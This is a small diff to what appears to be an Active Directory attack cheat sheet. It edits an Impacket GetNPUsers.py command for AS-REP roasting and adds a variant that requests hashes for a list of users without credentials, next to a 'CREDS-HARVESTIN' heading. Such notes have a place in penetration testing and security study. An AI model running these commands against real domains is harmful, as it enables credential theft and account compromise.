@@ -19,7 +19,9 @@ victim
 CREDS-HARVESTIN$
 ```
  ```
-GetNPUsers.py -dc-ip <DomainController_IP> <domain>/<user> -usersfile <path_to_users_file>   
+GetNPUsers.py -dc-ip <DomainController_IP> <domain name>/<user> -usersfile <path_to_users_file>
+#OR
+GetNPUsers.py <domain name>/ -no-pass -usersfile <path_to_users_file>  #if we have no creds
 ```
 **ex**
 ```
